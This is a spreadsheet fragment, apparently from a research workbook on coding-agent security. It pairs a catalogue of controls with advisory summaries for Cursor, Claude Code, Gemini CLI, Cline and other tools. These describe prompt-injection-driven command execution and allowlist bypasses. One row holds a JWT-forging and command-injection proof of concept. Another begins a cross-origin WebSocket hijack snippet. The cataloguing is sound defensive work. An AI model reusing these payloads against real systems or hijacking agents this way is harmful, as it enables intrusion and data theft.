      <c r="C4" s="2" t="inlineStr">
        <is>
          <t>D</t>
        </is>
      </c>
      <c r="D4" s="2" t="inlineStr">
        <is>
          <t>C06, C07</t>
        </is>
      </c>
    </row>
    <row r="5">
      <c r="A5" s="2" t="inlineStr">
        <is>
          <t>D4</t>
        </is>
      </c>
      <c r="B5" s="2" t="inlineStr">
        <is>
          <t>Input trust and goal integrity</t>
        </is>
      </c>
      <c r="C5" s="2" t="inlineStr">
        <is>
          <t>B</t>
        </is>
      </c>
      <c r="D5" s="2" t="inlineStr">
        <is>
          <t>C08, C09</t>
        </is>
      </c>
    </row>
    <row r="6">
      <c r="A6" s="2" t="inlineStr">
        <is>
          <t>D5</t>
        </is>
      </c>
      <c r="B6" s="2" t="inlineStr">
        <is>
          <t>Secrets and data protection</t>
        </is>
      </c>
      <c r="C6" s="2" t="inlineStr">
        <is>
          <t>C</t>
        </is>
      </c>
      <c r="D6" s="2" t="inlineStr">
        <is>
          <t>C10, C11</t>
        </is>
      </c>
    </row>
    <row r="7">
      <c r="A7" s="2" t="inlineStr">
        <is>
          <t>D6</t>
        </is>
      </c>
      <c r="B7" s="2" t="inlineStr">
        <is>
          <t>Code and supply-chain integrity</t>
        </is>
      </c>
      <c r="C7" s="2" t="inlineStr">
        <is>
          <t>B</t>
        </is>
      </c>
      <c r="D7" s="2" t="inlineStr">
        <is>
          <t>C12, C13, C14</t>
        </is>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="2" t="inlineStr">
        <is>
          <t>D7</t>
        </is>
      </c>
      <c r="B8" s="2" t="inlineStr">
        <is>
          <t>Accountability and recoverability</t>
        </is>
      </c>
      <c r="C8" s="2" t="inlineStr">
        <is>
          <t>D</t>
        </is>
      </c>
      <c r="D8" s="2" t="inlineStr">
        <is>
          <t>C15, C16, C17</t>
        </is>
      </c>
    </row>
    <row r="9">
      <c r="A9" s="2" t="inlineStr">
        <is>
          <t>D8</t>
        </is>
      </c>
      <c r="B9" s="2" t="inlineStr">
        <is>
          <t>Human oversight and appropriate reliance</t>
        </is>
      </c>
      <c r="C9" s="2" t="inlineStr">
        <is>
          <t>A</t>
        </is>
      </c>
      <c r="D9" s="2" t="inlineStr">
        <is>
          <t>C18, C19, C20</t>
        </is>
      </c>
    </row>
    <row r="10">
      <c r="A10" s="2" t="n"/>
      <c r="B10" s="2" t="n"/>
      <c r="C10" s="2" t="n"/>
      <c r="D10" s="2" t="n"/>
    </row>
    <row r="11">
      <c r="A11" s="4" t="inlineStr">
        <is>
          <t>Code</t>
        </is>
      </c>
      <c r="B11" s="4" t="inlineStr">
        <is>
          <t>Control</t>
        </is>
      </c>
      <c r="C11" s="4" t="inlineStr">
        <is>
          <t>Domain</t>
        </is>
      </c>
      <c r="D11" s="2" t="n"/>
    </row>
    <row r="12">
      <c r="A12" s="2" t="inlineStr">
        <is>
          <t>C01</t>
        </is>
      </c>
      <c r="B12" s="2" t="inlineStr">
        <is>
          <t>Least-privilege credentials and tool permissions</t>
        </is>
      </c>
      <c r="C12" s="2" t="inlineStr">
        <is>
          <t>D1</t>
        </is>
      </c>
      <c r="D12" s="2" t="n"/>
    </row>
    <row r="13">
      <c r="A13" s="2" t="inlineStr">
        <is>
          <t>C02</t>
        </is>
      </c>
      <c r="B13" s="2" t="inlineStr">
        <is>
          <t>Human approval gate for sensitive or irreversible actions</t>
        </is>
      </c>
      <c r="C13" s="2" t="inlineStr">
        <is>
          <t>D1</t>
        </is>
      </c>
      <c r="D13" s="2" t="n"/>
    </row>
    <row r="14">
      <c r="A14" s="2" t="inlineStr">
        <is>
          <t>C03</t>
        </is>
      </c>
      <c r="B14" s="2" t="inlineStr">
        <is>
          <t>Execution isolation (sandbox; dev/prod separation)</t>
        </is>
      </c>
      <c r="C14" s="2" t="inlineStr">
        <is>
          <t>D1</t>
        </is>
      </c>
      <c r="D14" s="2" t="n"/>
    </row>
    <row r="15">
      <c r="A15" s="2" t="inlineStr">
        <is>
          <t>C04</t>
        </is>
      </c>
      <c r="B15" s="2" t="inlineStr">
        <is>
          <t>Machine-enforced policy limits (deny rules, ignore files, allowlists)</t>
        </is>
      </c>
      <c r="C15" s="2" t="inlineStr">
        <is>
          <t>D2</t>
        </is>
      </c>
      <c r="D15" s="2" t="n"/>
    </row>
    <row r="16">
      <c r="A16" s="2" t="inlineStr">
        <is>
          <t>C05</t>
        </is>
      </c>
      <c r="B16" s="2" t="inlineStr">
        <is>
          <t>Workspace trust and scope confirmation before execution</t>
        </is>
      </c>
      <c r="C16" s="2" t="inlineStr">
        <is>
          <t>D2</t>
        </is>
      </c>
      <c r="D16" s="2" t="n"/>
    </row>
    <row r="17">
      <c r="A17" s="2" t="inlineStr">
        <is>
          <t>C06</t>
        </is>
      </c>
      <c r="B17" s="2" t="inlineStr">
        <is>
          <t>Faithful disclosure of planned actions (full arguments shown)</t>
        </is>
      </c>
      <c r="C17" s="2" t="inlineStr">
        <is>
          <t>D3</t>
        </is>
      </c>
      <c r="D17" s="2" t="n"/>
    </row>
    <row r="18">
      <c r="A18" s="2" t="inlineStr">
        <is>
          <t>C07</t>
        </is>
      </c>
      <c r="B18" s="2" t="inlineStr">
        <is>
          <t>Tamper-evident action logs</t>
        </is>
      </c>
      <c r="C18" s="2" t="inlineStr">
        <is>
          <t>D3</t>
        </is>
      </c>
      <c r="D18" s="2" t="n"/>
    </row>
    <row r="19">
      <c r="A19" s="2" t="inlineStr">
        <is>
          <t>C08</t>
        </is>
      </c>
      <c r="B19" s="2" t="inlineStr">
        <is>
          <t>Isolation and sanitization of untrusted inputs</t>
        </is>
      </c>
      <c r="C19" s="2" t="inlineStr">
        <is>
          <t>D4</t>
        </is>
      </c>
      <c r="D19" s="2" t="n"/>
    </row>
    <row r="20">
      <c r="A20" s="2" t="inlineStr">
        <is>
          <t>C09</t>
        </is>
      </c>
      <c r="B20" s="2" t="inlineStr">
        <is>
          <t>Allow-listed, integrity-checked tools and MCP servers</t>
        </is>
      </c>
      <c r="C20" s="2" t="inlineStr">
        <is>
          <t>D4</t>
        </is>
      </c>
      <c r="D20" s="2" t="n"/>
    </row>
    <row r="21">
      <c r="A21" s="2" t="inlineStr">
        <is>
          <t>C10</t>
        </is>
      </c>
      <c r="B21" s="2" t="inlineStr">
        <is>
          <t>Secret scanning, redaction and protected credential storage</t>
        </is>
      </c>
      <c r="C21" s="2" t="inlineStr">
        <is>
          <t>D5</t>
        </is>
      </c>
      <c r="D21" s="2" t="n"/>
    </row>
    <row r="22">
      <c r="A22" s="2" t="inlineStr">
        <is>
          <t>C11</t>
        </is>
      </c>
      <c r="B22" s="2" t="inlineStr">
        <is>
          <t>Network egress limits and data-handling policy</t>
        </is>
      </c>
      <c r="C22" s="2" t="inlineStr">
        <is>
          <t>D5</t>
        </is>
      </c>
      <c r="D22" s="2" t="n"/>
    </row>
    <row r="23">
      <c r="A23" s="2" t="inlineStr">
        <is>
          <t>C12</t>
        </is>
      </c>
      <c r="B23" s="2" t="inlineStr">
        <is>
          <t>Dependency, extension and release integrity verification</t>
        </is>
      </c>
      <c r="C23" s="2" t="inlineStr">
        <is>
          <t>D6</t>
        </is>
      </c>
      <c r="D23" s="2" t="n"/>
    </row>
    <row r="24">
      <c r="A24" s="2" t="inlineStr">
        <is>
          <t>C13</t>
        </is>
      </c>
      <c r="B24" s="2" t="inlineStr">
        <is>
          <t>Security testing gate before release or merge</t>
        </is>
      </c>
      <c r="C24" s="2" t="inlineStr">
        <is>
          <t>D6</t>
        </is>
      </c>
      <c r="D24" s="2" t="n"/>
    </row>
    <row r="25">
      <c r="A25" s="2" t="inlineStr">
        <is>
          <t>C14</t>
        </is>
      </c>
      <c r="B25" s="2" t="inlineStr">
        <is>
          <t>No auto-execution of untrusted workspace configuration</t>
        </is>
      </c>
      <c r="C25" s="2" t="inlineStr">
        <is>
          <t>D6</t>
        </is>
      </c>
      <c r="D25" s="2" t="n"/>
    </row>
    <row r="26">
      <c r="A26" s="2" t="inlineStr">
        <is>
          <t>C15</t>
        </is>
      </c>
      <c r="B26" s="2" t="inlineStr">
        <is>
          <t>Named human owner and authorization for agent actions</t>
        </is>
      </c>
      <c r="C26" s="2" t="inlineStr">
        <is>
          <t>D7</t>
        </is>
      </c>
      <c r="D26" s="2" t="n"/>
    </row>
    <row r="27">
      <c r="A27" s="2" t="inlineStr">
        <is>
          <t>C16</t>
        </is>
      </c>
      <c r="B27" s="2" t="inlineStr">
        <is>
          <t>Reversible actions (checkpoints, backup and rollback)</t>
        </is>
      </c>
      <c r="C27" s="2" t="inlineStr">
        <is>
          <t>D7</t>
        </is>
      </c>
      <c r="D27" s="2" t="n"/>
    </row>
    <row r="28">
      <c r="A28" s="2" t="inlineStr">
        <is>
          <t>C17</t>
        </is>
      </c>
      <c r="B28" s="2" t="inlineStr">
        <is>
          <t>Incident response, patching and disclosure process</t>
        </is>
      </c>
      <c r="C28" s="2" t="inlineStr">
        <is>
          <t>D7</t>
        </is>
      </c>
      <c r="D28" s="2" t="n"/>
    </row>
    <row r="29">
      <c r="A29" s="2" t="inlineStr">
        <is>
          <t>C18</t>
        </is>
      </c>
      <c r="B29" s="2" t="inlineStr">
        <is>
          <t>Autonomy level matched to risk (safe defaults for auto modes)</t>
        </is>
      </c>
      <c r="C29" s="2" t="inlineStr">
        <is>
          <t>D8</t>
        </is>
      </c>
      <c r="D29" s="2" t="n"/>
    </row>
    <row r="30">
      <c r="A30" s="2" t="inlineStr">
        <is>
          <t>C19</t>
        </is>
      </c>
      <c r="B30" s="2" t="inlineStr">
        <is>
          <t>Human review of agent-authored changes and commands</t>
        </is>
      </c>
      <c r="C30" s="2" t="inlineStr">
        <is>
          <t>D8</t>
        </is>
      </c>
      <c r="D30" s="2" t="n"/>
    </row>
    <row r="31">
      <c r="A31" s="2" t="inlineStr">
        <is>
          <t>C20</t>
        </is>
      </c>
      <c r="B31" s="2" t="inlineStr">
        <is>
          <t>Capability and limitation disclosure to users</t>
        </is>
      </c>
      <c r="C31" s="2" t="inlineStr">
        <is>
          <t>D8</t>
        </is>
      </c>
      <c r="D31" s="2" t="n"/>
    </row>
    <row r="32">
      <c r="A32" s="2" t="n"/>
      <c r="B32" s="2" t="n"/>
      <c r="C32" s="2" t="n"/>
      <c r="D32" s="2" t="n"/>
    </row>
    <row r="33">
      <c r="A33" s="2" t="inlineStr">
        <is>
          <t>Families</t>
        </is>
      </c>
      <c r="B33" s="2" t="inlineStr">
        <is>
          <t>A = Agency and oversight (D1, D2, D8); B = Input and code integrity (D4, D6); C = Data protection (D5); D = Transparency and accountability (D3, D7)</t>
        </is>
      </c>
      <c r="C33" s="2" t="n"/>
      <c r="D33"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16" customWidth="1" min="3" max="3"/>
    <col width="13" customWidth="1" min="4" max="4"/>
    <col width="11" customWidth="1" min="5" max="5"/>
    <col width="40" customWidth="1" min="6" max="6"/>
    <col width="90" customWidth="1" min="7" max="7"/>
    <col width="40" customWidth="1" min="8" max="8"/>
  </cols>
  <sheetData>
    <row r="1">
      <c r="A1" s="4" t="inlineStr">
        <is>
          <t>case_id</t>
        </is>
      </c>
      <c r="B1" s="4" t="inlineStr">
        <is>
          <t>batch</t>
        </is>
      </c>
      <c r="C1" s="4" t="inlineStr">
        <is>
          <t>product</t>
        </is>
      </c>
      <c r="D1" s="4" t="inlineStr">
        <is>
          <t>component_type</t>
        </is>
      </c>
      <c r="E1" s="4" t="inlineStr">
        <is>
          <t>published</t>
        </is>
      </c>
      <c r="F1" s="4" t="inlineStr">
        <is>
          <t>title</t>
        </is>
      </c>
      <c r="G1" s="4" t="inlineStr">
        <is>
          <t>description</t>
        </is>
      </c>
      <c r="H1" s="4" t="inlineStr">
        <is>
          <t>url</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="8" t="inlineStr">
        <is>
          <t>CA-013</t>
        </is>
      </c>
      <c r="B2" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C2" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D2" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E2" s="8" t="inlineStr">
        <is>
          <t>2025-08-01</t>
        </is>
      </c>
      <c r="F2" s="9" t="inlineStr">
        <is>
          <t>Cursor bypasses its allow list to execute arbitrary commands</t>
        </is>
      </c>
      <c r="G2" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions below 1.3, an attacker can bypass the allow list in auto-run mode with a backtick (`) or $(cmd). If a user has swapped Cursor from its default settings (requiring approval for every terminal call) to an allowlist, an attacker can execute arbitrary command execution outside of the allowlist without user approval. An attacker can trigger this vulnerability if chained with indirect prompt injection. This is fixed in version 1.3.</t>
        </is>
      </c>
      <c r="H2" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-54131</t>
        </is>
      </c>
    </row>
    <row r="3">
      <c r="A3" s="8" t="inlineStr">
        <is>
          <t>CA-020</t>
        </is>
      </c>
      <c r="B3" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C3" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D3" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E3" s="8" t="inlineStr">
        <is>
          <t>2025-08-05</t>
        </is>
      </c>
      <c r="F3" s="9" t="inlineStr">
        <is>
          <t>Cursor Agent is vulnerable to prompt injection via MCP Special Files</t>
        </is>
      </c>
      <c r="G3" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Cursor allows writing in-workspace files with no user approval in versions below 1.3.9, If the file is a dotfile, editing it requires approval but creating a new one doesn't. Hence, if sensitive MCP files, such as the .cursor/mcp.json file don't already exist in the workspace, an attacker can chain a indirect prompt injection vulnerability to hijack the context to write to the settings file and trigger RCE on the victim without user approval. This is fixed in version 1.3.9.</t>
        </is>
      </c>
      <c r="H3" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-54135</t>
        </is>
      </c>
    </row>
    <row r="4">
      <c r="A4" s="8" t="inlineStr">
        <is>
          <t>CA-026</t>
        </is>
      </c>
      <c r="B4" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C4" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D4" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E4" s="8" t="inlineStr">
        <is>
          <t>2025-08-22</t>
        </is>
      </c>
      <c r="F4" s="9" t="inlineStr">
        <is>
          <t>Roo-Code potential remote code execution via auto-execute command parsing flaw</t>
        </is>
      </c>
      <c r="G4" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent that lives in users' editors. In versions prior to 3.25.5, Roo-Code fails to properly handle process substitution and single ampersand characters in the command parsing logic for auto-execute commands. If a user has enabled auto-approved execution for a command such as ls, an attacker who can submit crafted prompts to the agent may inject arbitrary commands to be executed alongside the intended command. Exploitation requires attacker access to submit prompts and for the user to have enabled auto-approved command execution, which is disabled by default. This vulnerability could allow an attacker to execute arbitrary code. The issue is fixed in version 3.25.5.</t>
        </is>
      </c>
      <c r="H4" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-57771</t>
        </is>
      </c>
    </row>
    <row r="5">
      <c r="A5" s="8" t="inlineStr">
        <is>
          <t>CA-035</t>
        </is>
      </c>
      <c r="B5" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C5" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D5" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E5" s="8" t="inlineStr">
        <is>
          <t>2025-09-10</t>
        </is>
      </c>
      <c r="F5" s="9" t="inlineStr">
        <is>
          <t xml:space="preserve">Claude Code vulnerable to arbitrary code execution caused by maliciously configured git email </t>
        </is>
      </c>
      <c r="G5" s="9" t="inlineStr">
        <is>
          <t>At startup, Claude Code constructed a shell command that interpolated the value of `git config user.email` from the current workspace. If an attacker controlled the repository’s Git config (e.g., via a malicious `.git/config`) and set `user.email` to a crafted payload, the unescaped interpolation could trigger arbitrary command execution **before** the user accepted the workspace-trust dialog. The issue affects versions prior to `1.0.105`. The fix in `1.0.105` avoids executing commands built from untrusted configuration and properly validates/escapes inputs.  *   **Patches:** Update to `@anthropic-ai/claude-code` `1.0.105` or later. *   **Workarounds:** Open only trusted workspaces and inspect repository `.git/config` before launch; avoid inheriting untrusted Git configuration values.  &gt; Thank you to the NVIDIA AI Red Team for reporting this issue!</t>
        </is>
      </c>
      <c r="H5" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-j4h9-wv2m-wrf7</t>
        </is>
      </c>
    </row>
    <row r="6">
      <c r="A6" s="8" t="inlineStr">
        <is>
          <t>CA-085</t>
        </is>
      </c>
      <c r="B6" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C6" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D6" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E6" s="8" t="inlineStr">
        <is>
          <t>2026-02-10</t>
        </is>
      </c>
      <c r="F6" s="9" t="inlineStr">
        <is>
          <t>GitHub Copilot and Visual Studio Code Remote Code Execution Vulnerability</t>
        </is>
      </c>
      <c r="G6" s="9" t="inlineStr">
        <is>
          <t>Time-of-check time-of-use (toctou) race condition in GitHub Copilot and Visual Studio allows an authorized attacker to execute code over a network.</t>
        </is>
      </c>
      <c r="H6" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-21523</t>
        </is>
      </c>
    </row>
    <row r="7">
      <c r="A7" s="8" t="inlineStr">
        <is>
          <t>CA-088</t>
        </is>
      </c>
      <c r="B7" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C7" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D7" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E7" s="8" t="inlineStr">
        <is>
          <t>2026-03-05</t>
        </is>
      </c>
      <c r="F7" s="9" t="inlineStr">
        <is>
          <t>Trivy Vulnerability Scanner: Unauthorized AI Agent Execution Code Included in OpenVSX Extension Release</t>
        </is>
      </c>
      <c r="G7" s="9" t="inlineStr">
        <is>
          <t>Trivy Vulnerability Scanner is a VS Code extension that helps find vulnerabilities. In Trivy VSCode Extension version 1.8.12, which was distributed via OpenVSX marketplace was compromised and contained malicious code designed to leverage local AI coding agent to collect and exfiltrate sensitive information. Users using the affected artifact are advised to immediately remove it and rotate environment secrets. The malicious artifact has been removed from the marketplace. No other affected artifacts have been identified.</t>
        </is>
      </c>
      <c r="H7" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-28353</t>
        </is>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="8" t="inlineStr">
        <is>
          <t>CA-090</t>
        </is>
      </c>
      <c r="B8" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C8" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D8" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E8" s="8" t="inlineStr">
        <is>
          <t>2026-03-10</t>
        </is>
      </c>
      <c r="F8" s="9" t="inlineStr">
        <is>
          <t>@siteboon/claude-code-ui is Vulnerable to Shell Command Injection in Git Routes</t>
        </is>
      </c>
      <c r="G8" s="9" t="inlineStr">
        <is>
          <t># Shell Command Injection in User Git Config Endpoint  | Field | Value | |-------|-------| | **Severity** | High | | **CVSS 3.1** | 8.8 (High) — when chained with VULN-01 | | **CWE** | CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | | **Attack Vector** | Network | | **Authentication** | JWT required (bypassable via VULN-01) | | **Affected Files** | `server/routes/user.js` (lines 58-59) |  ## Description  The `/api/user/git-config` endpoint constructs shell commands by interpolating user-supplied `gitName` and `gitEmail` values into command strings passed to `child_process.exec()`. The input is placed within double quotes and only `"` is escaped, but backticks (`` ` ``), `$()` command substitution, and `\` sequences are all interpreted within double-quoted strings in bash.  This allows authenticated attackers to execute arbitrary OS commands via the git configuration endpoint.  ## Root Cause  `server/routes/user.js` lines 58-59:  ```javascript await execAsync(`git config --global user.name "${gitName.replace(/"/g, '\\"')}"`); await execAsync(`git config --global user.email "${gitEmail.replace(/"/g, '\\"')}"`); ```  Only `"` is escaped. However, within double-quoted bash strings, the following are still interpreted:  - `` `malicious_command` `` — backtick execution - `$(malicious_command)` — subshell execution  ## Impact  - **Remote Code Execution (RCE)** — arbitrary OS commands execute as the Node.js process user - The `git config --global` vector modifies the **server-wide** git configuration, affecting all git operations - When chained with VULN-01 (hardcoded JWT), this is fully **unauthenticated RCE** - Attacker can: read/write any file, install backdoors, pivot to other systems, exfiltrate data  ## Proof of Concept  ```bash # Step 1: Forge a JWT (see VULN-01) TOKEN=$(python3 -c "import jwt; print(jwt.encode({'userId':1,'username':'admin'}, 'claude-ui-dev-secret-change-in-production', algorithm='HS256'))")  # Step 2: Inject via gitName using command substitution curl -X POST "http://REDACTED:5173/api/user/git-config" \   -H "Authorization: Bearer $TOKEN" \   -H "Content-Type: application/json" \   -d '{"gitName":"$(id)","gitEmail":"attacker@example.com"}' ```  The server executes:  ``` git config --global user.name "$(id)" ```  Bash evaluates `$(id)` before passing it to git, executing the `id` command and setting the username to the output.  ## Remediation  Replace `exec()` with `spawn()` (array arguments, no shell):  ```javascript // BEFORE (vulnerable): await execAsync(`git config --global user.name "${gitName.replace(/"/g, '\\"')}"`);  // AFTER (safe): await spawnAsync('git', ['config', '--global', 'user.name', gitName]); await spawnAsync('git', ['config', '--global', 'user.email', gitEmail]); ```</t>
        </is>
      </c>
      <c r="H8" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7fv4-fmmc-86g2</t>
        </is>
      </c>
    </row>
    <row r="9">
      <c r="A9" s="8" t="inlineStr">
        <is>
          <t>CA-110</t>
        </is>
      </c>
      <c r="B9" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C9" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D9" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E9" s="8" t="inlineStr">
        <is>
          <t>2026-04-17</t>
        </is>
      </c>
      <c r="F9" s="9" t="inlineStr">
        <is>
          <t>Claude Code: Insecure System-Wide Configuration Loading Enables Local Privilege Escalation on Windows</t>
        </is>
      </c>
      <c r="G9" s="9" t="inlineStr">
        <is>
          <t>On Windows, Claude Code loaded system-wide default configuration from `C:\ProgramData\ClaudeCode\managed-settings.json` without validating directory ownership or access permissions. Because the `ProgramData` directory is writable by non-administrative users by default and the `ClaudeCode` subdirectory was not pre-created or access-restricted, a low-privileged local user could create this directory and place a malicious configuration file that would be automatically loaded for any user launching Claude Code on the same machine. Exploiting this would have required a shared multi-user Windows system and a victim user to launch Claude Code after the malicious configuration was placed.  Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Thank you to hackerone.com/edbr for reporting this issue.</t>
        </is>
      </c>
      <c r="H9" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-5cwg-9f6j-9jvx</t>
        </is>
      </c>
    </row>
    <row r="10">
      <c r="A10" s="8" t="inlineStr">
        <is>
          <t>CA-113</t>
        </is>
      </c>
      <c r="B10" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C10" s="8" t="inlineStr">
        <is>
          <t>Gemini CLI</t>
        </is>
      </c>
      <c r="D10" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E10" s="8" t="inlineStr">
        <is>
          <t>2026-04-24</t>
        </is>
      </c>
      <c r="F10" s="9" t="inlineStr">
        <is>
          <t>Gemini CLI: Remote Code Execution via workspace trust and tool allowlisting bypasses</t>
        </is>
      </c>
      <c r="G10" s="9" t="inlineStr">
        <is>
          <t># Summary  Gemini CLI (`@google/gemini-cli`) and the `run-gemini-cli` GitHub Action are being updated to harden workspace trust and tool allowlisting, in particular when used in untrusted environments like GitHub Actions. This update introduces a breaking change to how non-interactive (headless) environments handle folder trust, which may impact existing CI/CD workflows under specific conditions.  # Details  Folder Trust in Headless Mode  In previous versions, Gemini CLI running in CI environments (headless mode) automatically trusted workspace folders for the purpose of loading configuration and environment variables. This is potentially risky in situations where Gemini CLI runs on untrusted folders in headless mode (e.g. CI workflows that review user-submitted pull requests). If used with untrusted directory contents, this could lead to remote code execution via malicious environment variables in the local `.gemini/` directory.  To ensure consistency and user control, the latest update aligns headless mode behavior with interactive mode, requiring folders to be explicitly trusted before configuration files (such as `.env`) are processed.  As a result of this change, GitHub Actions and other automated pipelines that rely on the previous automatic trust behavior will fail to load workspace-specific settings until they are updated to use explicit trust mechanisms.  Tool Allowlisting under \--yolo  In previous versions, when Gemini CLI was configured to run in `--yolo` mode, it would ignore any fine grained tool allowlist in `~/.gemini/settings.json` (e.g. `run_shell_command(echo)` would allow any command). This is potentially risky in situations where Gemini CLI runs on untrusted inputs with `--yolo` (e.g. CI workflows that triage user-submitted GitHub issues where we recommend a strict allowlist). If used with untrusted content and a tool allowlist that permits `run_shell_command`, this could lead to remote code execution via prompt injection.  In version `0.39.1`, the Gemini CLI policy engine now evaluates tool allowlisting under `--yolo` mode, which is useful for CI workflows that allowlist a few safe commands to run when processing untrusted inputs. As a result, some workflows that previously depended on this behavior may fail silently unless tool allowlists are modified to fit the task.  # Impact  This impact is limited to workflows using Gemini CLI in headless mode. Any use of Gemini CLI in headless mode without folder trust will require manual review to correctly configure folder trust. **This affects all Gemini CLI GitHub Actions.** Users must review their workflows, and take one of two approaches:  1\. If the workflow runs on trusted inputs (e.g. reviewing PRs from trusted collaborators), set `GEMINI_TRUST_WORKSPACE: 'true'` in your workflow.  2\. If the workflow runs on untrusted inputs, review our guidance in [google-github-actions/run-gemini-cli](https://github.com/google-github-actions/run-gemini-cli) to harden your workflow against m</t>
        </is>
      </c>
      <c r="H10" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-wpqr-6v78-jr5g</t>
        </is>
      </c>
    </row>
    <row r="11">
      <c r="A11" s="8" t="inlineStr">
        <is>
          <t>CA-117</t>
        </is>
      </c>
      <c r="B11" s="8" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="C11" s="8" t="inlineStr">
        <is>
          <t>Cline</t>
        </is>
      </c>
      <c r="D11" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E11" s="8" t="inlineStr">
        <is>
          <t>2026-05-08</t>
        </is>
      </c>
      <c r="F11" s="9" t="inlineStr">
        <is>
          <t>Cline Kanban Server has a Cross-Origin WebSocket Hijacking Vulnerability</t>
        </is>
      </c>
      <c r="G11" s="9" t="inlineStr">
        <is>
          <t>## Summary  The `kanban` npm package (used by the `cline` CLI) starts a WebSocket server on `127.0.0.1:3484` with no Origin header validation. Any website a developer visits can silently connect to the kanban server via WebSocket and:  1. Leak sensitive data in real-time: workspace filesystem paths, task titles/descriptions, git branch info, AI agent chat messages 2. Hijack running AI agent terminals by injecting arbitrary prompts into the agent's input, leading to remote code execution 3. Kill running agent tasks by terminating active sessions via the control WebSocket  WebSocket connections are not subject to CORS restrictions. The browser sends them freely to localhost regardless of the page's origin. The kanban server accepts all connections without checking the Origin header.  ## Affected Component  - Package: `kanban` on npm (https://www.npmjs.com/package/kanban) - Repository: https://github.com/cline/kanban - Tested version: 0.1.59 - Installed via: `cline` CLI (`cline --kanban` or default `cline` command) - Endpoints: `ws://127.0.0.1:3484/api/runtime/ws`, `ws://127.0.0.1:3484/api/terminal/io`, `ws://127.0.0.1:3484/api/terminal/control`  ## Root Cause  Three WebSocket endpoints are exposed without authentication or Origin validation.  ### 1. Runtime state stream (no Origin check on upgrade)  ```javascript server.on("upgrade", (request, socket, head) =&gt; {     if (normalizeRequestPath(requestUrl.pathname) !== "/api/runtime/ws") {         return;     }     // No Origin header validation. Any website can connect.     deps.runtimeStateHub.handleUpgrade(request, socket, head, { requestedWorkspaceId }); }); ```  On connection, the server immediately sends a full snapshot of the developer's workspace:  ```javascript sendRuntimeStateMessage(client, {     type: "snapshot",     currentProjectId: projectsPayload.currentProjectId,     projects: projectsPayload.projects,       // filesystem paths     workspaceState,                            // tasks, git info, board     workspaceMetadata,                         // git summary     clineSessionContextVersion }); ```  ### 2. Terminal I/O (raw bytes written to agent terminal, no auth)  ```javascript ioServer.on("connection", (ws, context2) =&gt; {     ws.on("message", (rawMessage) =&gt; {         // Attacker's bytes written directly to the agent PTY         terminalManager.writeInput(taskId, rawDataToBuffer(rawMessage));     }); }); ```  ### 3. Terminal control (can kill tasks, no auth)  ```javascript controlServer.on("connection", (ws, context2) =&gt; {     ws.on("message", (rawMessage) =&gt; {         const message = parseWebSocketPayload(rawMessage);         if (message.type === "stop") {             terminalManager.stopTaskSession(taskId);         }     }); }); ```  ## Exploitation  ### Step 1: Cross-Origin Info Leak  From any website, JavaScript connects to the runtime WebSocket. No CORS applies:  ```javascript // Run this on https://example.com. It connects to the victim's local kanban. const ws = new 